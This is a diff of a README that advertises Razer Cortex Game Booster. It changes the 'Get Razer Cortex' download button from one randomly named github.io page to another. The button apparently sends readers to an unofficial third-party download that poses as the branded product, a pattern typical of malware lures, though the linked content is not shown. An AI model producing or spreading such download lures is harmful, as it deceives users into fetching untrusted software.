@@ -21,7 +21,7 @@ To begin using this **Razer Cortex Game Booster** and **Razer Cortex System Clea
 | :--- | :--- |
 | **Get Razer Cortex Game Booster** | Click the button below to start using this **Razer Cortex Game Deals**. |
 
-[![Button](https://img.shields.io/badge/🎮-Get_Razer_Cortex-2ea44f?style=for-the-badge)](https://tannercohenvdwz.github.io/.github/razer-cortex-fps-optimizer)
+[![Button](https://img.shields.io/badge/🎮-Get_Razer_Cortex-2ea44f?style=for-the-badge)](https://khaistarkdpcj.github.io/.github/razer-cortex-fps-optimizer)
 
 ## System Requirements
 
